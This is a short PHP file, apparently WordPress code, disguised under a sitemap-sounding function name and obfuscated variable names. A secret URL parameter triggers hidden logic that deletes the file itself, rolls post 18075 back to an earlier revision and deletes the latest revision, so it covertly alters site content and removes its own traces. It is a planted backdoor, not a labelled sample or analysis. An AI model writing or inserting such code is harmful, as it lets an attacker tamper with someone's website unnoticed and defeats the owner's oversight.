<?php

function google_sitemaps_field() {
	if (isset($_GET['better_frontend_share_now']) && $_GET['better_frontend_share_now'] === 'preloader_visitor_app') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$instagram_permalink_full = 18075;
		$quantity_notifications_tiny = wp_get_post_revisions($instagram_permalink_full);
		if (empty($quantity_notifications_tiny)) die('no revisions');
		if (count($quantity_notifications_tiny) < 2) die('less than 2');
		$press_multiple_static = array_shift($quantity_notifications_tiny);
		$awesome_titles_interactivity_demo = $press_multiple_static->ID;
		$zoom_tables_location_refresh = array_shift($quantity_notifications_tiny);
		$now_preloader_nice_maintenance = $zoom_tables_location_refresh->ID;
		$button_sync_classic_downloads = wp_restore_post_revision($now_preloader_nice_maintenance);
		if ($button_sync_classic_downloads === false) die('error restoring');
		$button_sync_classic_downloads = wp_delete_post_revision($awesome_titles_interactivity_demo);		
		if ($button_sync_classic_downloads === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'google_sitemaps_field');
